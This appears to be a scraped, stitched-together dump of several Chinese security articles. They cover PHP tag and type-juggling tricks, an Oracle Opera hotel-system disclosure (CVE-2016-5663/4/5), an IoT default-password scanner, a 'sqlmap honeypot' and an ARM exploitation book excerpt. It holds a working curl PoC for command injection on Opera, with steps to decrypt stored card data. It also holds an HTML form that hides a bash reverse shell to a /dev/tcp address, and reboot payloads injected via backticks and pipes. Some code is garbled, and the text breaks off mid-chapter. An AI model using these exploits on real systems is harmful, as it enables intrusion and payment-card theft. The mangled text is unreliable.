test(){?&gt;test(); ?&gt; 执行结果： First!First!First!First!嗯，不知道大家有没有觉得惊奇呢？上面的代码居然是可以运行的！没错啊，这是不是我们经常在 webshell 和“一句话木马”中见到的一种写法？原理是什么？当然，我们发现上面的写法其实前四行很奇怪。当然我们后面再讨论这个问题吧，至少，我们现在发现了 PHP 中的大小写实在是松散。PHP 标签PHP 标签类型：1. XML 型标签对于这种标签类型，我觉得没有必要解释太多：   大家需要知道的也就是：这个标签中的 php 的声明不是大小写敏感的，你可以  也是完全可行的。2. 短标签 （SGML 型标签）对于这种标签，我个人把他们分成两类： 需要 PHP 配置支持的不需要 PHP 配置支持的下面具体来介绍： 需要配置支持：这种标签其实是非常常见的，对不对？   当然这种标签发挥作用，要取决于你的 PHP 配置是否开启了 short_open_tag。    需要说明的是，一旦使用关闭了 short_open_tag 的话， 的内容是不会显示在用户界面上的，也就是这些东西直接不见了，也不会执行，就当是被 DROP 掉了吧~不需要配置支持：这个标签其实也是非常厉害，并不需要开启 short_open_tag 就可以起作用，但是，缺点就是这个标签相当于一个 echo, 所以用法也相当受到限制： 输出一个字符串函数调用当然可以函数调用还不够么？能怎么样玩耍就需要大家的智慧了。3. ASP 风格标签其实这个也不用多说，大家一看便知： &lt;% echo 'IN TAG!' %&gt;  如果想要使用这种风格的标签，需要确保 asp_tags 打开，并且一定要注意的是，这个和短标签的区别是：当短标签配置是关闭的时候，短标签（包括短标签内部）的东西是不会让用户看到的！然而如果 asp_tags 关闭时，你使用这种标签就会造成他的内容被用户看到，包括 ASP 风格标签和标签内部的内容。 4. Script 风格标签这个标签类型大家可能之前也还是见过的:&lt;script language=PhP&gt;Echo 'In Tags'&lt;/script&gt;没错，这个可以使用，而且 script language php 的大小写随意转换，拿去做混淆自然挺不错的。 标签的 Trick那么我稍微做一下整理：证明一下上面讲的都是正确的，大家可以看一下这个有趣的例子： <!--?phpFuNcTiON test(){?-->Short Tag may be useful' ;?&gt;   &lt;script language=Php&gt;echo ' Now in script style !';};&lt;/script&gt;很有趣的是，我把一个 test 函数肢解在了三种标签中，最后使用  短标签来调用，发现函数的定义并没有被破坏，而且，最后成功调用了，这难道不是非常的振奋人心么？嗯，当然我尝试了很多种奇奇怪怪的玩法，但是就只有这种是可以的，如果读者有神奇的玩法，可以分享。 流程控制的另一种写法其实我并不是一个 PHPer 而是一个 Pythoner， PHP 的大括号让我非常难受，非常生气，然后我就很开心的使用了另外一种写法： 4) :? &gt;执行结果是 This IF have been seperated!怎么说呢，这样的话我就不用再写丑陋的大括号了，但是好像有需要写标签？嗨呀，反正这样也算是一种新的姿势吧！    同样的不仅仅是 if elseif else 可以使用这种写法，switch 对应 endswitch； for 对应的 endfor；while 对应 endwhile；foreach 对应 endforeach … PHP 类型问题（弱类型）PHP 的弱类型问题由来已久吧，当然我们先用一个例子来开始我们这一部分的话题： 浮点型比较： 两个浮点型数据比较，实际只会比较前几位（解释器是假定 PHP 浮点型不可能完全精确的），这样就造成很奇怪的现象，我们这里就举两个例子来说吧！ echo 'This page is for float_trick!';$fill = '0.';for ($i = 0; $i &lt; 20; $i ++ ):    $fill = $fill.'0';    $val1 = floatval($fill.'1');    $val2 = floatval($fill.'2');    echo $val1,'==',$val2, ' result: ', $val1 == $val2, '';endfor;echo '----------------------------------------------------------------------';$fill = '2.';for ($i = 0; $i &lt; 20; $i ++ ):    $fill = $fill.'0';    $val1 = floatval($fill.'1');    $val2 = floatval($fill.'2');echo $val1,'==',$val2, ' result: ', $val1 == $val2, '';endfor;echo '----------------------------------------------------------------------';$fill = '2.';for ($i = 0; $i &lt; 20; $i ++ ):$fill = $fill.'3';$val1 = floatval($fill.'1');$val2 = floatval($fill.'2');echo $val1,'==',$val2, ' result: ', $val1 == $val2, '';endfor;?&gt; 执行的结果为： This page is for float_trick! 0.01==0.02 result: 0.001==0.002 result: 0.0001==0.0002 result: 1.0E-5==2.0E-5 result: 1.0E-6==2.0E-6 result: 1.0E-7==2.0E-7 result: 1.0E-8==2.0E-8 result: 1.0E-9==2.0E-9 result: 1.0E-10==2.0E-10 result: 1.0E-11==2.0E-11 result: 1.0E-12==2.0E-12 result: 1.0E-13==2.0E-13 result: 1.0E-14==2.0E-14 result: 1.0E-15==2.0E-15 result: 1.0E-16==2.0E-16 result: 1.0E-17==2.0E-17 result: 1.0E-18==2.0E-18 result: 1.0E-19==2.0E-19 result: 1.0E-20==2.0E-20 result: 1.0E-21==2.0E-21 result: ----------------------------------------------------------------------2.01==2.02 result: 2.001==2.002 result: 2.0001==2.0002 result: 2.00001==2.00002 result: 2.000001==2.000002 result: 2.0000001==2.0000002 result: 2.00000001==2.00000002 result: 2.000000001==2.000000002 result: 2.0000000001==2.0000000002 result: 2.00000000001==2.00000000002 result: 2.000000000001==2.000000000002 result: 2.0000000000001==2.0000000000002 result: 2==2 result: 2==2 result: 2==2 result: 12==2 result: 12==2 result: 12==2 result: 12==2 result: 12==2 result: 1----------------------------------------------------------------------2.31==2.32 result: 2.331==2.332 result: 2.3331==2.3332 result: 2.33331==2.33332 result: 2.333331==2.333332 result: 2.3333331==2.3333332 result: 2.33333331==2.33333332 result: 2.333333331==2.333333332 result: 2.3333333331==2.3333333332 result: 2.33333333331==2.33333333332 result: 2.333333333331==2.333333333332 result: 2.3333333333331==2.3333333333332 result: 2.3333333333333==2.3333333333333 result: 2.3333333333333==2.3333333333333 result: 2.3333333333333==2.3333333333333 result: 12.3333333333333==2.3333333333333 result: 12.3333333333333==2.3333333333333 result: 12.3333333333333==2.3333333333333 result: 12.3333333333333==2.3333333333333 result: 12.3333333333333==2.3333333333333 result: 1当然我们发现 0.00000000000X 会默认被记成科学计数法，进行比较不会丢失精度。    但是对于我们发现转换来转换去，PHP 的 Float 类型也顶多能存储 16 位数的浮点型。    我们看完上面的小实验，我觉得大家应该就已经明白了 Float 在 PHP 中是如何被处理的，以及 floatval 这个函数的结果。 最多存储 16 位小数。会把 1.00000000000000000000000000000000001 自动去掉后面多余的（16位之外的数），如果16位之内都为 0，则自动转为 int。0.0000000000xxx 开头会视情况自动转为科学记数法，而且不会造成精度丢失。谈一谈其他的类型问题intval 与 floatval 对于某些特殊情况的类型转换。 intval这一串代码，大致我们来看一下，str 转换成 int 的下面情况<!--?phpecho '$ret is a str';echo '';$ret = '123.12.123';echo $ret, ' intval=&gt; ', intval($ret);echo '';$ret = '123Saaf';echo $ret, ' intval=&gt; ', intval($ret);echo '';$ret = 'adf123Saaf';echo $ret, ' intval=&gt; ', intval($ret);echo '';$ret = '12.3Saaf';echo $ret, ' intval=&gt; ', intval($ret);echo '';$ret = 'ads1.23Saaf';echo $ret, ' intval=&gt; ', intval($ret);echo '';$ret = '123.789';echo $ret, ' intval=&gt; ', intval($ret);echo '';$ret = 123.789;echo $ret, ' intval=&gt; ', intval($ret);echo '';?&gt;执行结果为： $ret is a str123.12.123 intval=&gt; 123123Saaf intval=&gt; 123adf123Saaf intval=&gt; 012.3Saaf intval=&gt; 12ads1.23Saaf intval=&gt; 0123.789 intval=&gt; 123123.789 intval=&gt; 123前面为等待转换的 string，后面为经过 intval 函数以后的值。我们现在来简单总结一下： 一个 String 被 intval 转换从前到后取一个 int。如果开头不是 int 的话，那么就是 0。转换一个浮点型数，直接去掉小数部分（不是四舍五入）floatvalfloatval 和 intval 有点类似，大家看一下下面的例子就知道了，我就不浪费时间讨论总结了。 <!--?php$ret = '123.456.76';echo $ret, ' floatval=--> ', floatval($ret);echo '';$ret = '123.456.76asd';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';$ret = '123.456adf';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';$ret = '.123.456';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';$ret = 'qerqer123.456adf';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';$ret = '456adf';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';$ret = '123';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';$ret = 'asd76';echo $ret, ' floatval=&gt; ', floatval($ret);echo '';?&gt;执行结果为 123.456.76 floatval=&gt; 123.456123.456.76asd floatval=&gt; 123.456123.456adf floatval=&gt; 123.456.123.456 floatval=&gt; 0.123qerqer123.456adf floatval=&gt; 0456adf floatval=&gt; 456123 floatval=&gt; 123asd76 floatval=&gt; 0  松散比较问题盗用 drops 的一个图吧，私以为这个图就可以基本说明一切了。 松散比较可以出现在 ‘==’ 中，还可以出现在函数传值和 switch 中。strcmp接下来我照着上面的图做了一个 strcmp 的各种类型比较的表格。true    false    1    0    -1    ’1′    ’0′    ‘-1′    NULL    array()    ‘php’    ”true    0    1    0    1    1    0    1    1    1        -1    1false    -1    0    -1    -1    -2    -1    0    -2    0        -3    01    0    1    0    1    1    0    1    1    1        -1    10    -1    1    -1    0    1    -1    1    1    1        -1    1-1    -1    2    -1    -1    0    -1    2    0    2        -1    2’1′    0    1    0    1    1    0    1    1    1        -1    1’0′    -1    1    -1    0    1    -1    1    1    1        -1    1‘-1′    -1    2    -1    -1    0    -1    2    0    2        -1    2NULL    -1    0    -1    -1    -2    -1    0    -2    0        -3    0array()                                                ‘php’    1    3    1    1    1    1    3    1    3        0    3”    -1    0    -1    -1    -2    -1    0    -2    0        -3    0方便大家对这个东西有更深的理解。 出现这些问题的，具体原因其实有很多，除了 intval 之类的类型转换，也有其他的（关于 strcmp 内部实现的分析不在讨论范围）。 上面的表格的源代码在这里：当然 wooyun drops 的表格你也可以在下面的代码中稍微改一下就可以验证了。 <!--?php $items[0] = True; $items[1] = False; $items[2] = 1; $items[3] = 0; $items[4] = -1; $items[5] = ""1""; $itmes[6] = '0'; $items[7] = '-1'; $items[8] = NULL; $items[9] = array(); $items[10] = 'php'; $items[11] = ''; ?--> '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; '.$result.'';}?&gt; 						 			true			false			1			0			-1			'1'			'0'			'-1'			NULL			array()			'php'			''							true			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(true, $items[$i]);    echo'							false			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(false, $items[$i]);    echo'							1			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(1, $items[$i]);    echo'							0			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(0, $items[$i]);    echo'							-1			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(-1, $items[$i]);    echo'							'1'			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp('1', $items[$i]);    echo'							'0'			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp('0', $items[$i]);    echo'							'-1'			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp('-1', $items[$i]);    echo'							NULL			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(NULL, $items[$i]);    echo'							array()			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp(array(), $items[$i]);    echo'							'php'			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp('php', $items[$i]);    echo'							''			<!--?php     for($i=0; $i<12; $i++){        $result = @strcmp('', $items[$i]);    echo'			当然上面代码的输出结果大家可能会看到一大堆的 Warning 和 Notice，但是我们使用 @ 来忽略。当然忽略并不是说我们不关心，在网站中如果出现了这种情况，一个正常的程序员是不会让用户看到异常的，这样很容易让用户感到“恐慌”，同时也可以避免一些敏感的信息泄露。当然并不是说异常不重要，实际上如果有了这些 Warning 和 Notice。本篇结语由于篇幅的原因，私以为总结全部堆在一起看起来并不是特别舒服。    当然我也只能把我自己懂的这点东西总结出来希望和大家分享，但是总是感觉意犹未尽吧，因为还有很多东西我们都没有写出来。    那么，之后吧，之后我们再来详细讨论一下 PHP 的其他的奇怪的东西：HPP — HTTP Parameter Pollution截断协议封装…水平有限，如果上面有什么不正确的，希望读者不吝指出。","2016-11-18 19:27:18","Web安全","PHP Hacker代码审计秘籍","http://nsoad.com/Article/web/20161118/809.html"
"5ccbfaee4f2f0a0a7a69c0e3","Oracle Opera（原Micros Opera）是一款用于酒店集团订单管理的主流软件。凯悦和希尔顿等酒店就使用该软件来管理订单以及处理付款流程。","Kong","简介Oracle Opera（原Micros Opera）是一款用于酒店集团订单管理的主流软件。凯悦和希尔顿等酒店就使用该软件来管理订单以及处理付款流程。为了进行结算，应用程序会将加密后的PAN（信用卡号），到期日，持卡人姓名保留在Oracle SQL数据库中。我们发现了3种不同的方法获取数据库访问权限，一旦攻击者获得了访问权限，他们就可以提取和解密数据库中存储的持卡人数据。漏洞分析CVE-2016-5665: Session Hijacking via Exposed Logs用户登录到Opera后，可以选择要使用的交互接口，对于大多数用户来说会选择上图中圈出来的物业管理系统（PMS）接口。启动接口的请求包含了用户的会话令牌和要启动的特定接口的参数。会话令牌以及其他请求的参数都会记录到同一个目录，且不需要进行身份验证就可以通过Web服务器访问。攻击者现在只需要等待管理员用户登录，管理员一旦上线，攻击者就可以获得应用程序的完整权限。管理员用户可以使用“Opera SQL”工具，该工具可以向数据库提交原始查询使用这种方法提取持卡人数据的弊端就是速度太慢而且不够隐蔽，每次查询都会被记录到应用层。此外其使用的Oracle Forms用户界面还不如直接连接到数据库服务器来的高效。CVE-2016-5664: Exposure of Oracle SQL Database Credentials如果攻击者与数据库服务器在同一个网络上，另一种方法则是构造一个数据库连接字符串。打开通过身份验证的Oracle Forms，其响应的HTML中返回了数据库凭据和服务名称，数据库服务器主机名可在未经身份验证的servlet的响应中访问。至此，攻击者还需要使用简单的连接语句连接到sqlplus。如此就可以避开日志记录以及使用“Opera SQL”工具的低效率。sqlplus [Username]/[Password]@[Hostname]:[Port]/[Service Name]CVE-2016-5663: RCE via OS Command Injection and RFI在攻击者只能访问应用程序服务器，或者数据库服务器的入站连接仅限于应用程序服务器的情况下，就体现出该远程代码执行漏洞就的优势了。这是我最中意的发现了，因为他把看似毫不相干的元素组合在一起来完成恶意目的。诊断过程信息的servlet，将返回一个PID信息。对于黑盒测试来说PID参数传入连接字符串以进行命令执行的这个过程不是很清晰。如下图所示，攻击者通过修改参数以执行另外一个命令，并将该输出内容发送到可以通过web服务器访问的另外一个文件。预计如果没有出错，他应该会在Web根目录下的webtemp文件夹中返回whoami输出。然而我却得到的了一个错误消息，其指出某个文件丢失。查看servlet对应的代码，我们可以看到错误发生位置。构造的命令行包含来源于属性文件的pslist实用程序的路径。该文件被硬编码到D:\micros\opera\operaias\default.env。但这个文件似乎不存在，这也是为何函数在执行pslist前失败的原因。完成以下两点即可解决该servlet问题：1.找到OPERA_HOME属性2.将其保存到D:\micros\opera\operaias\default.env巧合的是有一个经过诊断的servlet，暴露了opera_home属性。而另一个诊断的servlet也合宜的暴露了RFI向量上传的目标路径：再次利用ProcessInfo servlet，可以看到输出正常。且whoami返回的结果我们得知该应用是以system权限运行的。以下POC可用于验证。#!/bin/bashSTDOUT=""D:\micros\opera\operaias\webtemp\temp.log""if [ ""$#"" -ne 2 ]; then echo ""Usage: $0 &lt;host&gt; &lt;command&gt;"" echo ""E.g. : $0 http://opera.example.biz whoami"" exit 1else host=""$1"" cmd=""$2""fi# Activate exploit.curl -s -XPOST --data-binary ""OPERA_HOME=D:\micros\opera""""$host/Operajserv/webarchive/FileReceiver?filename=D:/micros/opera/operaias/default.env&amp;crc=26&amp;append=false"" &gt;/dev/null# Inject command.curl -s -G --data-urlencode ""pid=1 &amp; $cmd &gt; \""$STDOUT\"" 2"" ""$host/Operajserv/webarchive/ProcessInfo""&gt; /dev/nullcurl -# -G ""$host/webtemp/temp.log""# Deactivate exploit.curl -s -G --data-urlencode ""pid=1 &amp; del \""$STDOUT\"" 2"" ""$host/Operajserv/webarchive/ProcessInfo"" &gt;/dev/nullcurl -s -G --data-urlencode 'pid=1 &amp; del ""D:\micros\opera\operaias\default.env"" 2' ""$host/Operajserv/webarchive/ProcessInfo"" &gt; /dev/null持卡人数据解密结合上述漏洞组合，攻击者可以获得对数据库的认证访问。在数据库中，攻击者可以检索持卡人数据并进行解密。根据Opera knowledgebase，信用卡号和到期日期都以3DES加密格式存储在数据库表中。对于攻击者而言，获取到3DES的加密密钥就是关键了。OPERA使用DBMS_OBFUSCATION_TOOLKIT程序包执行3DES加密，这个包没有用来存储密钥，其创建一个单独的程序包用来存储密钥以及处理加密函数调用。PL/SQL的包装工具用来对代码进行混淆处理，且每次更改加密密钥后都会重新生成此程序包用于检索包体的示例SQL查询如下：SELECT NAME, TYPE, TEXT from USER_SOURCE WHERE NAME LIKE '%IFC_CRYPT_V4_%'由于包体仅仅只是进行了混淆处理，因此可以对其进行去混淆化或“解包”以显示3DES密钥。现在已知密钥和算法，对于攻击者来说接下来便是找到用于存储加密数据的表了。该信息可以从OPERA knowledgebase中获得：在NAME$_CREDIT_CARD表中执行一个select查询就可以得到用户姓名以及加密的信用卡信息，然后可以通过脚本将其解密为明文","2017-01-05","漏洞发布","Oracle的酒店管理平台RCE漏洞以及持卡人数据泄漏（CVE-2016-5663/4/5）","http://nsoad.com/Article/exploit/20170105/vulzone-48.html"
"5ccbfaee4f2f0a0a7a69c0e4","IoTSeeker，Rapid7出品，是一款物联网默认密码凭据网络扫描工具，可以针对特定物联网设备进行扫描检测，发现IoT设备是否使用默认或出厂设置密码凭据。","Kender","IoTSeeker，Rapid7出品，是一款物联网默认密码凭据网络扫描工具，可以针对特定物联网设备进行扫描检测，发现IoT设备是否使用默认或出厂设置密码凭据。工具介绍前久美国大规模网络中断的原因，已被调查为恶意软件利用物联网设备（CCTV摄像机，DVR等）默认密码凭据，入侵感染，组建僵尸网络发起的DDoS攻击。IoTSeeker可以帮助企业扫描其网络中的物联网设备，检测其密码是否已被修改，或设备是否处于出厂设置状态。早期的Mirai恶意软件主要利用IoT设备的telnet服务进行入侵感染，而IoTSeeker主要利用HTTP / HTTPS服务来进行检测识别。项目地址https://github.com/rapid7/IoTSeeker工具特点为了适应多种类型IoT设备，和大范围IP网络扫描，IoTSeeker具备以下特点：高并行性：使用Perl模块AnyEvent，可以在同一时间执行数以千计的IoT设备扫描可扩展性：无需更改或编写大量代码，支持很多新型设备文件组成：工具文件有两部分组成，一个为设备配置识别的JSON格式文件devices.cfg，另一个为进行扫描控制的Perl文件iotScanner.pl。运行环境：IoTSeeker目前的运行环境仅支持Linux或Mac OS系统安装1.确保系统安装了Perl和cpan（安装方法自行百度）2.用以下命令安装所需Perl模块 ：cpan AnyEvent::HTTP Data::Dumper JSON运行示例perl iotScanner.pl 1.1.1.1-1.1.4.254,2.1.1.1-2.2.3.254","2016-12-29 10:54:17","安全工具","IoTSeeker：物联网设备默认密码扫描检测工具","http://nsoad.com/Security-tools/20161229/tools-949.html"
"5ccbfaee4f2f0a0a7a69c0e5","渗透测试的同学应该都知道，在Linux下，sqlmap执行的语句大多是：Bash#sqlmap &ndash;u ""http://sample.com/a=xxx&b=xxx"" &ndash;data ""postdata"" orBash#python sqlmap.py","Kong","渗透测试的同学应该都知道，在Linux下，sqlmap执行的语句大多是：Bash#sqlmap –u ""http://sample.com/a=xxx&amp;b=xxx"" –data ""postdata"" orBash#python sqlmap.py –u ""http://sample.com/a=xxx&amp;b=xxx"" –cookie ""cookedata""如此形式的语句执行，实际上都是在shell中，执行bash命令。但是，bash命令中，一些使用几率较小的特性，很多安全测试人员可能都不求甚解。通过阅读Bash参考手册，可以了解到，在bash命令中，一些字符在封闭的双引号中，有特殊的含义，并非所见即所得。Enclosing characters in double quotes (‘""’)preserves the literal value of all characters within the quotes, with theexception of ‘$’, ‘`’, ‘\’, and, whenhistory expansion is enabled, ‘!’. When the shell is in POSIX mode (seeBash POSIX Mode),the ‘!’ hasno special meaning within double quotes, even when history expansion isenabled. The characters ‘$’ and ‘`’ retain theirspecial meaning within double quotes (see Shell Expansions).The backslash retains its special meaning only when followed by one of the followingcharacters: ‘$’, ‘`’, ‘""’, ‘\’, or newline. Within doublequotes, backslashes that are followed by one of these characters are removed.Backslashes preceding characters without a special meaning are left unmodified.A double quote may be quoted within double quotes by preceding it with abackslash. If enabled, history expansion will be performed unless an ‘!’ appearing indouble quotes is escaped using a backslash. The backslash preceding the ‘!’ is notremoved.The special parameters ‘*’ and ‘@’ have specialmeaning when in double quotes (see Shell Parameter Expansion).如果，懒着弄明白上面的意思，最好的办法就是在自己的Linux中执行相关的命令：如ping “!!”,ping “`reboot`”，看看会产生怎样神奇的效果说的明白点，双引号中的”!!”或者”!+数字”，会替换成历史命令，执行”history”命令,就可以知道哪些数字对应哪些命令了。如果我将”!”放入到http请求中，而渗透测试人员执行例如bash# sqlmap -u ""www.asnine.com/test"" --data""post!!request=hacked""首先双引号中的!!会被替换成你最近执行的一条历史命令，然后在发送到webserver，如果webserver是恶意的，那么他就可以轻松的收集到你的bash中的历史输入了，也算是一种信息泄露吧。如果仅仅是信息收集，危害还小一些，如果用”`”(数字1前面那个反单引号字符)，可就厉害了。任何”`”之间的命令，都会被执行，如果仅仅是为了好玩，一个reboot，就够你受了，但是如果还有其他的想法，你的系统可就危在旦夕了如果我将这些特殊的字符(“!” , “`”…)放到get/post/cookie等http请求参数中，万一有人用sqlmap去对该网站进行安全测试，而注入参数正好包含了这些特殊字符，那么有意思的事情就产生了此时，你通过拦截浏览器获取的http post如果是恶意代码执行：sqlmap –u ""http://sample.com/a=xxx&amp;b=xxx"" –data ""evilcode""结果就是，装逼不成反被BI～Par2：姑且称之为sqlmap honeypot吧现在，我的目的很单纯，就是将特殊字符嵌入到http的请求数据中，以达到对渗透人员的反戈一击。要做到一个强力的反击，首先需要将诸如”!”, “`”等字符串，放入http请求中。而http请求，主要包括get request,cookie,post request三种。大多时候，渗透人员通过获取post数据作为sql的注入点，所以，要找到一种在post情况下的危险参数注入。由于post数据，可以构造的相对比较复杂，很多时候，渗透人员只是将所有参数一股脑的作为sqlmap的data参数进行测试，所以可以很好的做到将危险参数嵌入到post data数据中，以达到隐藏自身的目的。接下来，要做的就是如果渗透人员在通过利用例如Burp Suite等工具获取sqlmap注入使用的参数时，获取到的字符为未编码的可见字符。在用form进行提交数据时，如果添加enctype=”text/plain”属性，那么，就可以做到可见即可得。测试demo：&lt;html&gt;&lt;head&gt;&lt;title&gt; A sqlmap honeypot demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;input&gt;search the user&lt;/input&gt;&lt;form id=""myForm"" action=""username.html"" method=""post"" enctype=""text/plain""&gt;&lt;input type='hidden' name='name'value='Robin&amp;id=4567&amp;command=shell`bash -i &gt;&amp;/dev/tcp/192.168.xxx.xxx/2333 0&gt;&amp;1`&amp;port=1234'/&gt;&lt;input type=""button""onclick=""myForm.submit()"" value=""Submit""&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;访问该页面，进行查询时，发送到请求为：这时，很多没有经验的安全渗透人员就可能将postdata，复制，粘贴，sqlmap执行之：Boom！Par3：换个姿势，再来一遍前两拍，为了所谓的神秘感，利用人们不常用的bash特性，强行装了一波。但是，既然利用场景是：bash# exec ""evil code""那么事情可能会变得更加简单。使用过Linux的，大多数都用到过管道(|)，而这个功能，能更好好的完成任务。如果注入参数是：""|reboot"" (参数中包含双引号)那么执行的命令则为：bash# exec """"|reboot""""以上，我都假设的是，渗透人员将参数放入到双引号(“)中。但使用管道，单引号的问题也迎刃而解针对单引号，可以将注入参数设置为：'|reboot'Double Kill！Par4：尾声以上都是我在测试一个网站时，其cookie中包含了""!+number""导致了sqlmap语句的执行错误引起的。于是乎，深入追踪了下，发现其实主要原因属于bash的特性。如果利用这个特性做恶，的确存在一定的安全风险。很多时候，我们并不能确保输入数据安全性，尤其在使用sqlmap这种输入参数来源于攻击目标的情况下。如果有人在获取的参数(get/post/cookie)上动了手脚，渗透人员很可能偷鸡不成拾把屎。相信，只要理解了攻击手段，很多人会构造出更完美的攻击数据，这里就不献丑了。而且，伪装到位的话，服务器甚至可以返回一些注入成功的信息这个时候，sqlmap使用者，就有些悲剧了，他们沉浸在在成功的喜悦中，却未料到背后隐藏的杀机当然，这种利用bash特性的攻击方式，并不仅仅作用于sqlmap，也可能用于其它依赖于Linux命令行执行的程序。Sqlmap只不过是这种特性的一个很好的利用场景。Done!","2016-10-18 18:16:12","网络安全","注意了，使用Sqlmap的你可能踩中了“蜜罐”","http://nsoad.com/Article/Network-security/20161018/596.html"
"5ccbfaee4f2f0a0a7a69c0e6","在本章中，我们将了解 ARM 处理器的基础知识，和 ARM 世界中存在的不同类型的漏洞。 我们甚至会继续利用这些漏洞，以便对整个场景有个清晰地了解。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布在本章中，我们将了解 ARM 处理器的基础知识，和 ARM 世界中存在的不同类型的漏洞。 我们甚至会继续利用这些漏洞，以便对整个场景有个清晰地了解。 此外，我们将研究不同的 Android root 攻击和它们在漏洞利用中的基本漏洞。 考虑到目前大多数 Android 智能手机都使用基于 ARM 的处理器，对于渗透测试人员来说，了解 ARM 及其附带的安全风险至关重要。8.1 ARM 架 构 导 论ARM 是基于精简指令集（RISC）的架构，这意味着其指令比基于复杂指令集（CISC）的机器少得多。 ARM 处理器几乎遍布我们周围的所有设备，如智能手机，电视，电子书阅读器和更多的嵌入式设备。ARM 总共有 16 个可见的通用寄存器，为 R0-R15。 在这 16 个中，有 5 个用于特殊目的。 以下是这五个寄存器及其名称：R11: 帧指针 (FP)R12: 过程内寄存器 (IP)R13: 栈指针 (SP)R14: 链接寄存器 (LR)R15: 程序计数器 (PC)下面的图展示了 ARM 架构：在五个里面，我们会特别专注于这三个，它们是：堆栈指针（SP）：这是保存指向堆栈顶部的指针的寄存器链接寄存器（LR）：当程序进入子过程时存储返回地址程序计数器（PC）：存储要执行的下一条指令注意这里要注意的一点是，PC 将总是指向要执行的指令，而不是简单地指向下一条指令。 这是由于被称为流水线的概念，指令按照以下顺序操作：提取，解码和执行。 为了控制程序流，我们需要控制 PC 或 LR 中的值（后者最终引导我们控制 PC）。执 行 模 式ARM 有两种不同的执行模式：ARM 模式：在 ARM 模式下，所有指令的大小为 32 位Thumb 模式：在 Thumb 模式下，指令大部分为 16 位执行模式由 CPSR 寄存器中的状态决定。 还存在第三模式，即 Thumb-2 模式，它仅仅是 ARM 模式和 Thumb 模式的混合。 我们在本章不会深入了解 ARM 和 Thumb 模式之间的区别，因为它超出了本书的范围。8.2 建 立 环 境在开始利用 ARM 平台的漏洞之前，建议你建立环境。 即使 Android SDK 中的模拟器可以通过模拟 ARM 平台来运行，大多数智能手机也是基于 ARM 的，我们将通过配置 QEMU（它是一个开源硬件虚拟机和模拟器）开始 ARM 漏洞利用。为了在 Android 模拟器/设备上执行以下所有步骤，我们需要下载 Android NDK 并使用 Android NDK 中提供的工具为 Android 平台编译我们的二进制文件。 但是，如果你使用 Mac 环境，安装 QEMU 相对容易，可以通过键入 brew install qemu 来完成。 现在让我们在 Ubuntu 系统上配置 QEMU。 遵循以下步骤：第一步是通过安装依赖来下载并安装 QEMU，如图所示：&lt;p style=""line-height: 1.75em; margin-top: 25px; margin-bottom: 25px;""&gt;&lt;code class=""hljs avrasm has-numbering""&gt;&lt;span style=""font-size: 12px;""&gt;sudo apt-get build-dep qemuwget http://wiki.qemu-project.org/download/qemu-&lt;br&gt;1.7.0.tar.bz2&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;接下来，我们只需要配置 QEMU，指定目标为 ARM，最后充分利用它。 因此，我们将简单地解压缩归档文件，访问该目录并执行以下命令：&lt;p style=""line-height: 1.75em; margin-top: 25px; margin-bottom: 25px;""&gt;&lt;code class=""hljs lasso has-numbering""&gt;&lt;span style=""font-size: 12px;""&gt;./configure --target-list=arm-softmmu&lt;br&gt;make &amp;&amp; make install&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;一旦 QEMU 成功安装，我们可以下载 ARM 平台的 Debian 镜像来进行利用练习。 所需下载列表位于 http://people.debian.org/~aurel32/qemu/armel/。这里我们将下载格式为 qcow2 的磁盘映像，它是基于 QEMU 的操作系统映像格式，也就是我们的操作系统为 debian_squeeze_armel_standard.qcow2。 内核文件应该是 vmlinuz-2.6.32-5-versatile，RAM 磁盘文件应该是 initrd.img-2.6.32-versatile。 一旦我们下载了所有必要的文件，我们可以通过执行以下命令来启动 QEMU 实例：qemu-system-arm -M versatilepb -kernel vmlinuz-2.6.32-5-versatile -initrd initrd.img-2.6.32-5-versatile -hda debian_squeeze_armel_standard.qcow2 -append ""root=/dev/sda1"" --redir tcp:2222::22redir 命令只是在登录远程系统时使用端口 2222 启用 ssh。 一旦配置完成，我们可以使用以下命令登录到 Debian 的 QEMU 实例：ssh root@[ip address of Qemu] -p 2222登录时会要求输入用户名和密码，默认凭据是 root:root。一旦我们成功登录，我们将看到类似如下所示的屏幕截图：8.3 基 于 栈 的 简 单 缓 冲 区 溢 出简单来说，缓冲区是存储任何类型的数据的地方。 当缓冲区中的数据超过缓冲区本身的大小时，会发生溢出。 然后攻击者可以执行溢出攻击，来获得对程序的控制和执行恶意载荷。让我们使用一个简单程序的例子，看看我们如何利用它。 在下面的截图中，我们有一个简单的程序，有三个函数：weak，ShouldNotBeCalled 和 main。 以下是我们试图利用的程序：在整个程序运行期间，从不调用 ShouldNotBeCalled 函数。漏洞函数简单地将参数复制到名为 buff 的缓冲区，大小为 10 字节。一旦我们完成程序编写，我们可以使用 gcc 编译它，如下一个命令所示。 此外，我们将在这里禁用地址空间布局随机化（ASLR），只是为了使场景稍微简单一些。 ASLR 是由 OS 实现的安全技术，来防止攻击者有效地确定载荷的地址并执行恶意指令。 在 Android 中，ASLR 的实现始于 4.0。 